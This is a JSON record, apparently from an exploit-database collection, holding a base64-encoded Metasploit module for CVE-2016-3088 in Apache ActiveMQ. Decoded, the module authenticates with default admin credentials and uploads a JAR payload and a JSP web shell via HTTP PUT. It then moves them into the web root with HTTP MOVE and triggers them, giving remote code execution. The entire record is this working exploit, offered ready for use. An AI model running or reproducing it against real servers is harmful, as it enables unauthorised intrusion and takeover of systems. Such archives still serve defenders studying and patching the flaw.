{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBFeGNlbGxlbnRSYW5raW5nDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkZpbGVEcm9wcGVyDQoNCiAgZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KICAgIHN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQogICAgICAnTmFtZScgICAgICAgID0+ICdBY3RpdmVNUSB3ZWIgc2hlbGwgdXBsb2FkJywNCiAgICAgICdEZXNjcmlwdGlvbicgPT4gJXEoDQogICAgICAgIFRoZSBGaWxlc2VydmVyIHdlYiBhcHBsaWNhdGlvbiBpbiBBcGFjaGUgQWN0aXZlTVEgNS54IGJlZm9yZSA1LjE0LjANCiAgICAgICAgYWxsb3dzIHJlbW90ZSBhdHRhY2tlcnMgdG8gdXBsb2FkIGFuZCBleGVjdXRlIGFyYml0cmFyeSBmaWxlcyB2aWEgYW4NCiAgICAgICAgSFRUUCBQVVQgZm9sbG93ZWQgYnkgYW4gSFRUUCBNT1ZFIHJlcXVlc3QuDQogICAgICApLA0KICAgICAgJ0F1dGhvcicgICAgICA9PiBbICdJYW4gQW5kZXJzb24gPGFuZHJzbjg0W2F0XWdtYWlsLmNvbT4nLCAnSGlsbGFyeSBCZW5zb24gPDFuN3IxZ3UzW2F0XWdtYWlsLmNvbT4nIF0sDQogICAgICAnTGljZW5zZScgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ1JlZmVyZW5jZXMnICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWyAnQ1ZFJywgJzIwMTYtMzA4OCcgXSwNCiAgICAgICAgICBbICdVUkwnLCAnaHR0cDovL2FjdGl2ZW1xLmFwYWNoZS5vcmcvc2VjdXJpdHktYWR2aXNvcmllcy5kYXRhL0NWRS0yMDE2LTMwODgtYW5ub3VuY2VtZW50LnR4dCcgXQ0KICAgICAgICBdLA0KICAgICAgJ1ByaXZpbGVnZWQnICA9PiB0cnVlLA0KICAgICAgJ1BsYXRmb3JtJyAgICA9PiAld3sgamF2YSBsaW51eCB3aW4gfSwNCiAgICAgICdUYXJnZXRzJyAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0phdmEgVW5pdmVyc2FsJywNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgJ1BsYXRmb3JtJyA9PiAnamF2YScsDQogICAgICAgICAgICAgICdBcmNoJyA9PiBBUkNIX0pBVkENCiAgICAgICAgICAgIH0NCiAgICAgICAgICBdLA0KICAgICAgICAgIFsgJ0xpbnV4JywNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgJ1BsYXRmb3JtJyA9PiAnbGludXgnLA0KICAgICAgICAgICAgICAnQXJjaCcgPT4gQVJDSF9YODYNCiAgICAgICAgICAgIH0NCiAgICAgICAgICBdLA0KICAgICAgICAgIFsgJ1dpbmRvd3MnLA0KICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICdQbGF0Zm9ybScgPT4gJ3dpbicsDQogICAgICAgICAgICAgICAnQXJjaCcgPT4gQVJDSF9YODYNCiAgICAgICAgICAgICB9DQogICAgICAgICAgIF0NCiAgICAgICAgXSwNCiAgICAgICdEaXNjbG9zdXJlRGF0ZScgPT4gIkp1biAwMSAyMDE2IiwNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyAgPT4gMCkpDQogICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICAgIFsNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnQmFzaWNBdXRoVXNlcicsIFsgdHJ1ZSwgJ1RoZSB1c2VybmFtZSB0byBhdXRoZW50aWNhdGUgYXMnLCAnYWRtaW4nIF0pLA0KICAgICAgICBPcHRTdHJpbmcubmV3KCdCYXNpY0F1dGhQYXNzJywgWyB0cnVlLCAnVGhlIHBhc3N3b3JkIGZvciB0aGUgc3BlY2lmaWVkIHVzZXJuYW1lJywgJ2FkbWluJyBdKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnSlNQJywgWyBmYWxzZSwgJ0pTUCBuYW1lIHRvIHVzZSwgZXhjbHVkaW5nIHRoZSAuanNwIGV4dGVuc2lvbiAoZGVmYXVsdDogcmFuZG9tKScsIG5pbCBdKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnQXV0b0NsZWFudXAnLCBbIGZhbHNlLCAnUmVtb3ZlIHdlYiBzaGVsbHMgYWZ0ZXIgY2FsbGJhY2sgaXMgcmVjZWl2ZWQnLCAndHJ1ZScgXSksDQogICAgICAgIE9wdDo6UlBPUlQoODE2MSkNCiAgICAgIF0pDQogICAgcmVnaXN0ZXJfYWR2YW5jZWRfb3B0aW9ucygNCiAgICAgIFsNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnVXBsb2FkUGF0aCcsIFtmYWxzZSwgJ0N1c3RvbSBkaXJlY3RvcnkgaW50byB3aGljaCB3ZWIgc2hlbGxzIGFyZSB1cGxvYWRlZCcsIG5pbF0pDQogICAgICBdKQ0KICBlbmQNCg0KICBkZWYganNwX3RleHQocGF5bG9hZF9uYW1lKQ0KICAgICV7DQogICAgPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLioiDQogICAgJT48JUAgcGFnZSBpbXBvcnQ9ImphdmEubmV0LioiDQogICAgJT48JQ0KICAgIFVSTENsYXNzTG9hZGVyIGNsID0gbmV3IGphdmEubmV0LlVSTENsYXNzTG9hZGVyKG5ldyBqYXZhLm5ldC5VUkxbXXtuZXcgamF2YS5pby5GaWxlKHJlcXVlc3QuZ2V0UmVhbFBhdGgoIi4vI3twYXlsb2FkX25hbWV9LmphciIpKS50b1VSSSgpLnRvVVJMKCl9KTsNCiAgICBDbGFzcyBjID0gY2wubG9hZENsYXNzKCJtZXRhc3Bsb2l0LlBheWxvYWQiKTsNCiAgICBjLmdldE1ldGhvZCgibWFpbiIsQ2xhc3MuZm9yTmFtZSgiW0xqYXZhLmxhbmcuU3RyaW5nOyIpKS5pbnZva2UobnVsbCxuZXcgamF2YS5sYW5nLk9iamVjdFtde25ldyBqYXZhLmxhbmcuU3RyaW5nWzBdfSk7DQogICAgJT59DQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQogICAgamFyX3BheWxvYWQgPSBwYXlsb2FkLmVuY29kZWRfamFyLnBhY2sNCiAgICBwYXlsb2FkX25hbWUgPSBkYXRhc3RvcmVbJ0pTUCddIHx8IHJhbmRfdGV4dF9hbHBoYSg4ICsgcmFuZCg4KSkNCiAgICBob3N0ID0gIiN7ZGF0YXN0b3JlWydSSE9TVCddfToje2RhdGFzdG9yZVsnUlBPUlQnXX0iDQogICAgQHVybCA9IGRhdGFzdG9yZVsnU1NMJ10gPyAiaHR0cHM6Ly8je2hvc3R9IiA6ICJodHRwOi8vI3tob3N0fSINCiAgICBwYXRocyA9IGdldF91cGxvYWRfcGF0aHMNCiAgICBwYXRocy5lYWNoIGRvIHxwYXRofA0KICAgICAgaWYgdHJ5X3VwbG9hZChwYXRoLCBqYXJfcGF5bG9hZCwgcGF5bG9hZF9uYW1lKQ0KICAgICAgICBicmVhayBoYW5kbGVyIGlmIHRyaWdnZXJfcGF5bG9hZChwYXlsb2FkX25hbWUpDQogICAgICAgIHByaW50X2Vycm9yKCdVbmFibGUgdG8gdHJpZ2dlciBwYXlsb2FkJykNCiAgICAgIGVuZA0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgdHJ5X3VwbG9hZChwYXRoLCBqYXJfcGF5bG9hZCwgcGF5bG9hZF9uYW1lKQ0KICAgIFsnLmphcicsICcuanNwJ10uZWFjaCBkbyB8ZXh0fA0KICAgICAgZmlsZV9uYW1lID0gcGF5bG9hZF9uYW1lICsgZXh0DQogICAgICBkYXRhID0gZXh0ID09ICcuanNwJyA/IGpzcF90ZXh0KHBheWxvYWRfbmFtZSkgOiBqYXJfcGF5bG9hZA0KICAgICAgbW92ZV9oZWFkZXJzID0geyAnRGVzdGluYXRpb24nID0+ICIje0B1cmx9I3twYXRofSN7ZmlsZV9uYW1lfSIgfQ0KICAgICAgdXBsb2FkX3VyaSA9IG5vcm1hbGl6ZV91cmkoJ2ZpbGVzZXJ2ZXInLCBmaWxlX25hbWUpDQogICAgICBwcmludF9zdGF0dXMoIlVwbG9hZGluZyAje21vdmVfaGVhZGVyc1snRGVzdGluYXRpb24nXX0iKQ0KICAgICAgcmVnaXN0ZXJfZmlsZXNfZm9yX2NsZWFudXAgIiN7cGF0aH0je2ZpbGVfbmFtZX0iIGlmIGRhdGFzdG9yZVsnQXV0b0NsZWFudXAnXS5jYXNlY21wKCd0cnVlJykNCiAgICAgIHJldHVybiBlcnJvcl9vdXQgdW5sZXNzIHNlbmRfcmVxdWVzdCgnUFVUJywgdXBsb2FkX3VyaSwgMjA0LCAnZGF0YScgPT4gZGF0YSkgJiYNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfcmVxdWVzdCgnTU9WRScsIHVwbG9hZF91cmksIDIwNCwgJ2hlYWRlcnMnID0+IG1vdmVfaGVhZGVycykNCiAgICAgIEB0cmlnZ2VyX3Jlc291cmNlID0gL3dlYmFwcHMoLiopLy5tYXRjaChwYXRoKVsxXQ0KICAgIGVuZA0KICAgIHRydWUNCiAgZW5kDQoNCiAgZGVmIGdldF91cGxvYWRfcGF0aHMNCiAgICBiYXNlX3BhdGggPSAiI3tnZXRfaW5zdGFsbF9wYXRofS93ZWJhcHBzIg0KICAgIGN1c3RvbV9wYXRoID0gZGF0YXN0b3JlWydVcGxvYWRQYXRoJ10NCiAgICByZXR1cm4gW25vcm1hbGl6ZV91cmkoYmFzZV9wYXRoLCBjdXN0b21fcGF0aCldIHVubGVzcyBjdXN0b21fcGF0aC5uaWw/DQogICAgWyAiI3tiYXNlX3BhdGh9L2FwaS8iLCAiI3tiYXNlX3BhdGh9L2FkbWluLyIgXQ0KICBlbmQNCg0KICBkZWYgZ2V0X2luc3RhbGxfcGF0aA0KICAgIHByb3BlcnRpZXNfcGFnZSA9IHNlbmRfcmVxdWVzdCgnR0VUJywgIiN7QHVybH0vYWRtaW4vdGVzdC9zeXN0ZW1Qcm9wZXJ0aWVzLmpzcCIpLmJvZHkNCiAgICBtYXRjaCA9IHByb3BlcnRpZXNfcGFnZS50cigiXG4iLCAnQCcpLm1hdGNoKC9hY3RpdmVtcVwuaG9tZTxcL3RkPkBccyo8dGQ+KFteQF0rKTxcL3RkPi8pDQogICAgcmV0dXJuIG1hdGNoWzFdIHVubGVzcyBtYXRjaC5uaWw/DQogIGVuZA0KDQogIGRlZiBzZW5kX3JlcXVlc3QobWV0aG9kLCB1cmksIGV4cGVjdGVkX3Jlc3BvbnNlID0gMjAwLCBvcHRzID0ge30pDQogICAgb3B0c1snaGVhZGVycyddIHx8PSB7fQ0KICAgIG9wdHNbJ2hlYWRlcnMnXVsnQXV0aG9yaXphdGlvbiddID0gYmFzaWNfYXV0aChkYXRhc3RvcmVbJ0Jhc2ljQXV0aFVzZXInXSwgZGF0YXN0b3JlWydCYXNpY0F1dGhQYXNzJ10pDQogICAgb3B0c1snaGVhZGVycyddWydDb25uZWN0aW9uJ10gPSAnY2xvc2UnDQogICAgciA9IHNlbmRfcmVxdWVzdF9jZ2koDQogICAgICB7DQogICAgICAgICdtZXRob2QnICA9PiBtZXRob2QsDQogICAgICAgICd1cmknICAgICA9PiB1cmkNCiAgICAgIH0ubWVyZ2Uob3B0cykNCiAgICApDQogICAgcmV0dXJuIGZhbHNlIGlmIHIubmlsPyB8fCBleHBlY3RlZF9yZXNwb25zZSAhPSByLmNvZGUudG9faQ0KICAgIHINCiAgZW5kDQoNCiAgZGVmIHRyaWdnZXJfcGF5bG9hZChwYXlsb2FkX25hbWUpDQogICAgc2VuZF9yZXF1ZXN0KCdQT1NUJywgQHVybCArIEB0cmlnZ2VyX3Jlc291cmNlICsgcGF5bG9hZF9uYW1lICsgJy5qc3AnKQ0KICBlbmQNCg0KICBkZWYgZXJyb3Jfb3V0DQogICAgcHJpbnRfZXJyb3IoJ1VwbG9hZCBmYWlsZWQnKQ0KICAgIEB0cmlnZ2VyX3Jlc291cmNlID0gbmlsDQogICAgZmFsc2UNCiAgZW5kDQplbmQ=", 
    "filename": "platforms/java/remote/42283.rb", 
    "id": "42283", 
    "cves": [
        "CVE-2016-3088"
    ]
}